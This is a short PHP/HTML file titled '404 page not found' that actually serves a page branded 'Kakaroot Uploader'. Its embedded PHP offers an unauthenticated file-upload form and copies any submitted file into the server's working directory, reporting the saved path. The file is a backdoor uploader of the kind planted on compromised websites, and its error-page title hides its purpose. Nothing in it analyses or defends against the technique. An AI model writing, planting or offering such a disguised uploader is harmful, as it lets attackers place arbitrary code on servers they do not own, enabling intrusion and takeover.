<html lang='en-US'>
<head>
    <title>404 page not found</title>
    <link rel="stylesheet" type="text/css" href="style.css">
    <body bgcolor="black" link="orange" text="orange">
        <style>
            .link,
            .link:link,
            .link:active,
            .link:visited{
                background: 00000;
                color: white;
                text-decoration: none;
                padding: 10px;  
            }
            .link:hover{
                background: 00000;
            }
            .style1 {
                    font-family: Indie Flower;
                    font-size: 12px;
            }
        </style>
        <br><center><font><font size="6" color=white><font color=orange> Kakaroot </font>Uploader</font></center>
        <br><center><img src="https://i.postimg.cc/rw4X3GzQ/on-X.jpg" width="300" height="350"></center>
        <br><br>
        <center>
            <?php
            echo "<br><form action='' enctype='multipart/form-data' method='POST'>
            <input type='file' name='filena'> <input type='submit' name='upload' value='Upload'><br>";
            if(isset($_POST['upload'])){
                $cwd=getcwd();
                $tmp=$_FILES['filena']['tmp_name'];
                $filena=$_FILES['filena']['name'];
                if(@copy($tmp, $filena)){
                    echo "<font><br>Success -> $cwd/$filena</font>";
                }else{
                    echo "<font><br>Failed -> Permission Denied</font>";
                }
            }
        ?>
        <br>
    </body>
</html>
